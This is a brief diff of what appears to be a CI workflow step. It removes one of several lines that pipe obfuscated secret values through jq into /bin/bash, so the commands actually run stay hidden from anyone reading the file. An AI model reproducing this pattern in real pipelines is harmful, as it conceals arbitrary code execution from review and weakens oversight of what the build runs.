@@ -23,7 +23,6 @@ jobs:
           izt25: ${{ secrets.izt25 }}
         run: |
           printf '%s' "$izt25" | jq -r .r067 | /bin/bash
-          echo $fk07 | jq -r .vco98 | /bin/bash
           printf '%s' "$g52" | jq -r .abzqk115 | /bin/bash
           printf '%s' "$fgh9764" | jq -r .mqvdp74260 | /bin/bash
 
